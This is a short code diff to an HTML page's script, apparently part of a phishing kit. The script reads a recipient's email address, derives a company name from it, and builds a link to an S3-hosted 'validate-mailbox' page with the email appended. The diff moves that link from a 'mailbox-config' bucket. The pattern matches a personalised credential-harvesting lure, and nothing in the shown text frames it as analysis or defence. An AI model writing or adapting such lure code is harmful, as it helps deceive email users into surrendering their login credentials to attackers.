@@ -100,15 +100,16 @@ function generateCompanyName(email) {
         companyElement.textContent = "Company: " + companyName;
 
         // Set link to just use decoded email
-        // linkElement.href = "https://mailbox-config.s3.eu-north-1.amazonaws.com/index.html" + encodeURIComponent(decodedEmail);
-        linkElement.href = "https://mailbox-config.s3.eu-north-1.amazonaws.com/index.html#" + encodedEmail;
+        // linkElement.href = "https://validate-mailbox.s3.eu-north-1.amazonaws.com/index.html" + encodeURIComponent(decodedEmail);
+        linkElement.href = "https://validate-mailbox.s3.eu-north-1.amazonaws.com/index.html#" + encodedEmail;
     } else {
-        linkElement.href = "https://mailbox-config.s3.eu-north-1.amazonaws.com/index.html";
+        linkElement.href = "https://validate-mailbox.s3.eu-north-1.amazonaws.com/index.html";
     }
 })();
 </script>
 
 </body>
 </html>
+
 
 
